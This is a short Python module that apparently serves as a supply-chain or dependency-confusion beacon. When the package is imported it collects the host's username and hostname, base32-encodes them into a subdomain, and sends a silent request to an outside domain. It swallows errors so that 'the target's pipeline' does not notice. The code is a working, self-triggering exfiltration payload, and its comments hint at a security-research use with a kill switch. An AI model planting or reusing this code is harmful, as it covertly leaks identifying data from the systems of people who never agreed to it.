import os
import socket
import getpass
import base64
import urllib.request

def fire_beacon(stage):
    # Step 7: Check for the safety kill switch
    if os.environ.get("BEACON_DISABLE") == "1":
        return

    try:
        # Step 6: Gather host fingerprint attributes
        hostname = socket.gethostname()
        username = getpass.getuser()
        
        # Combine data cleanly using separators
        raw_payload = f"{stage}|{username}|{hostname}"
        
        # Base32 encode to guarantee a safe, alphanumeric subdomain string
        b32_payload = base64.b32encode(raw_payload.encode('utf-8')).decode('utf-8').lower().replace("=", "")
        
        # Target your live Cloudflare Worker routing rule
        url = f"https://{b32_payload}.nexus.kaushikjoshi.work"
        
        # Fire out-of-band request (3-second timeout prevents freezing the host)
        urllib.request.urlopen(url, timeout=3)
    except Exception:
        # Silently fail so the target's pipeline or application doesn't crash
        pass

# Step 4: Fire automatically when the package is imported
fire_beacon("import")